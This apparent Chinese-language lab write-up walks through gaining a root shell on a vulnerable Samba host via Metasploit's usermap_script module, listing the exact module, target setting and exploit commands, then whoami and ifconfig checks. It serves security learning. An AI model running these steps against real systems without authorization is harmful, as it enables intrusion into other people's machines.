---
title: samba提权
date: 2021-12-20 17:46:48
tags: 
    - samba
    - 提权
---

## samba提权

### 利用samba漏洞，获得目标主机root权限

#### 原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。

#### 过程：

确定目标存在`445`和`139`端口开放，使用msf，输入命令`search samba`

![image-20211220184011444](https://gitee.com/oxchang/img-host/raw/master/samba提权/image-20211220184011444.png)

使用命令`use exploit/multi/samba/usermap_script`，启用漏洞利用模块，终端输入`info`，查看相关信息

![image-20211220184341512](https://gitee.com/oxchang/img-host/raw/master/samba提权/image-20211220184341512.png)

输入`set RHOST ip`,设置目标ip地址，输入`exploit`，开始攻击，攻击成功后，建立会话

![image-20211220190130652](https://gitee.com/oxchang/img-host/raw/master/samba提权/image-20211220190130652.png)

输入`whoami`查看权限，输入`ifconfig`，查看系统网络信息

![image-20211220190258566](https://gitee.com/oxchang/img-host/raw/master/samba提权/image-20211220190258566.png)

实验完成

